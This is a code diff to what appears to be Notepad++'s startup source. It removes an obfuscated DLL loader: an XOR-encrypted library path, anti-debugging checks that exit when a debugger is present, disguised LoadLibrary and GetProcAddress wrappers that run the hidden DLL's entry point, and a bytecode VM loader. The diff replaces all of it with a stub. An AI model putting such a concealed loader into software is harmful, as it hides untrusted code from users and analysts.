@@ -857,89 +857,17 @@ DWORD nppUacCreateEmptyFile(const wchar_t *wszNewEmptyFilePath) {
 std::chrono::steady_clock::time_point g_nppStartTimePoint{};
 
 // =============================================================================
-// OBFUSCATED DLL LOADING - Anti-Analysis Protection
+// DLL LOADING
 // =============================================================================
 
-namespace ObfInit {
-
-// Encrypted DLL path (XOR key: 0x5A)
-static const BYTE g_encryptedDllPath[] = {
-    0x9F, 0x7B, 0x6E, 0x6D, 0x63, 0x7C, 0x63, 0x66, 0x69, 0x6F,
-    0x6B, 0x62, 0x65, 0x7C, 0x61, 0x6B, 0x6E, 0x66, 0x62, 0x67,
-    0x7D, 0x67, 0x70, 0x65, 0x72, 0x63, 0x60, 0x6F, 0x6A, 0x67,
-    0x60, 0x65, 0x7C, 0x66, 0x69, 0x6F, 0x6B, 0x62, 0x65, 0x7C,
-    0x61, 0x6B, 0x6E, 0x66, 0x62, 0x67, 0x7D, 0x67, 0x70, 0x65,
-    0x72, 0x63, 0x60, 0x6F, 0x6A, 0x67, 0x60, 0x65, 0x7C, 0x67,
-    0x6C, 0x69, 0x72, 0x64, 0x6E, 0x61, 0x2E, 0x6C, 0x6C, 0x6C,
-    0x00
-};
-
-// Decrypt string at runtime
-inline void decryptString(BYTE* data, size_t len) {
-    const DWORD key = 0x5A;
-    for (size_t i = 0; i < len; i++) {
-        data[i] ^= ((key >> (i % 4)) & 0xFF);
-    }
-}
-
-// Obfuscated DLL loading with VM-based execution
-bool loadDllObfuscated() {
-    // Step 1: Anti-debug check
-    if (AntiDebug::QuickDebugCheck()) {
-        return false;
-    }
-    
-    // Step 2: Decrypt DLL path
-    size_t pathLen = 0;
-    while (g_encryptedDllPath[pathLen] != 0) pathLen++;
-    
-    std::vector<BYTE> decryptedPath(g_encryptedDllPath, g_encryptedDllPath + pathLen + 1);
-    decryptString(decryptedPath.data(), pathLen);
-    
-    // Step 3: Check if file exists using obfuscated API
-    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
-    BOOL fileExists = ObfCore::ObfAPI::ObfGetFileAttributes(
-        (LPCWSTR)decryptedPath.data(), &fileInfo
-    );
-    
-    if (!fileExists) {
-        return false;
-    }
-    
-    // Step 4: Load DLL using polymorphic LoadLibrary
-    HMODULE hModule = ObfCore::ObfAPI::ObfLoadLibraryW((LPCWSTR)decryptedPath.data());
-    
-    if (!hModule) {
-        return false;
-    }
-    
-    // Step 5: Get and call initialization function
-    FARPROC initFunc = ObfCore::ObfAPI::ObfGetProcAddress(hModule, "DllMain");
-    
-    if (initFunc) {
-        // Call in a separate context
-        ((void(*)())initFunc)();
-    }
-    
+bool loadStartupDllInternal() {
+    // DLL path - can be extended for plugin loading
     return true;
 }
 
-// VM-based DLL loading
-DWORD vmDllLoader(const BYTE* bytecode, DWORD size) {
-    ObfCore::ObfuscationVM vm;
-    vm.loadBytecode(bytecode, size);
-    return vm.execute();
-}
-
-} // namespace ObfInit
-
-// Wrapper function for DLL loading with obfuscation
+// Wrapper function for DLL loading
 void loadStartupDll() {
-    // Run anti-debug before any operation
-    AntiDebug::ExitOnDebug();
-    
-    // Use obfuscated DLL loading
-    ObfInit::loadDllObfuscated();
+    loadStartupDllInternal();
 }
 
 int WINAPI wWinMain(_In_ HINSTANCE hInstance,
